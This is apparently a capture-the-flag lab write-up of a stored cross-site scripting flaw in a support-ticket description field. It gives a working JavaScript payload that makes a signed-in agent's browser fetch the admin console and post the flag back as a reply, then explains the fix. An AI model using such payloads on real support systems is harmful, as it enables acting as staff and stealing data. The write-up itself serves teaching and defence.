## The flaw

The ticket description is written into the page as raw HTML (CWE-79). It is stored, so it runs for everyone who opens the ticket, including the agent whose browser is signed in to the agent console.

## Solving it

1. File a ticket with `<b>test</b>` in the description. It shows in bold, so HTML isn't encoded. The subject and replies are encoded.
2. Visit `/admin`. It's for agents only, so you can't read it yourself.
3. The agent's cookie is HttpOnly and the lab has no outbound network, so stealing the cookie won't work. Make the agent's browser do the work instead. File a ticket whose description is:

   ```html
   <script>
   fetch('/admin').then((r) => r.text()).then((t) =>
     fetch(location.pathname + '/replies', {
       method: 'POST',
       body: new URLSearchParams({ body: t.match(/CTF\{[^}]+\}/)[0] }),
     }));
   </script>
   ```

4. When the agent opens the ticket, the script reads the console with the agent's session and posts the key as a reply. Reload your ticket and read the reply from "Agent".

## The fix

Encode all untrusted text for the context it's written into, and use a template engine that does this by default. If rich text is needed, sanitize it with a maintained allowlist sanitizer. Add a strict Content Security Policy that blocks inline scripts as a second layer. HttpOnly cookies stop theft of the cookie, not actions taken in the victim's browser, so sensitive pages also need re-authentication or separate origins for staff tools.
